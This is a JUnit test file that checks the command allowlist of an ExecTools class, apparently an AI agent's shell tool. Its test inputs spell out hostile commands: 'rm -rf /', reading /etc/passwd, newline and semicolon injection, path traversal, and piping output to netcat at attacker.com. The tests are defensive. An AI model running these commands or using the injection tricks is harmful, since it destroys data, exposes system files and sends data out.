package com.friday.tools;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;

class ExecToolsTest {

    @TempDir Path projectRoot;
    ExecTools exec;

    @BeforeEach
    void setUp() {
        exec = new ExecTools(projectRoot);
    }

    @Test
    void allowedCommand_ls_returnsOutput() {
        // ls . always succeeds in a temp dir
        String result = exec.executeCommand("ls .");
        assertThat(result).doesNotContain("blocked");
    }

    @Test
    void allowedCommand_mvnVersion_isPermitted() {
        // Either runs or fails because mvn isn't on PATH — must NOT be "blocked"
        String result = exec.executeCommand("mvn --version");
        assertThat(result).doesNotContain("blocked");
    }

    @Test
    void blockedCommand_rm_isRejected() {
        String result = exec.executeCommand("rm -rf /");
        assertThat(result).contains("blocked");
    }

    @Test
    void blockedCommand_curl_isRejected() {
        String result = exec.executeCommand("curl http://evil.com");
        assertThat(result).contains("blocked");
    }

    @Test
    void blockedCommand_cat_isRejected() {
        // cat was in the old allowlist — must now be blocked
        String result = exec.executeCommand("cat /etc/passwd");
        assertThat(result).contains("blocked");
    }

    @Test
    void newlineInjection_isRejected() {
        // \n in command string bypassed the old semicolon/pipe regex
        String result = exec.executeCommand("git status\ncat /etc/passwd");
        assertThat(result).contains("blocked");
    }

    @Test
    void carriageReturnInjection_isRejected() {
        String result = exec.executeCommand("git status\rcat /etc/passwd");
        assertThat(result).contains("blocked");
    }

    @Test
    void pathTraversal_ls_isRejected() {
        String result = exec.executeCommand("ls ../../etc");
        assertThat(result).contains("blocked");
    }

    @Test
    void absolutePath_ls_isRejected() {
        String result = exec.executeCommand("ls /etc");
        assertThat(result).contains("blocked");
    }

    @Test
    void gitPush_isRejected() {
        String result = exec.executeCommand("git push origin dev");
        assertThat(result).contains("blocked");
    }

    @Test
    void gitStatus_isPermitted() {
        // Runs in temp dir — may fail if not a git repo, but must NOT return "blocked"
        String result = exec.executeCommand("git status");
        assertThat(result).doesNotContain("blocked");
    }

    @Test
    void metacharacterInjection_semicolon_isRejected() {
        // Semicolon splits on whitespace into "echo", "hello;", "rm" — "echo" is blocked
        String result = exec.executeCommand("echo hello; rm -rf /");
        assertThat(result).contains("blocked");
    }

    @Test
    void metacharacterInjection_pipe_isRejected() {
        String result = exec.executeCommand("ls | nc attacker.com 4444");
        assertThat(result).contains("blocked");
    }
}
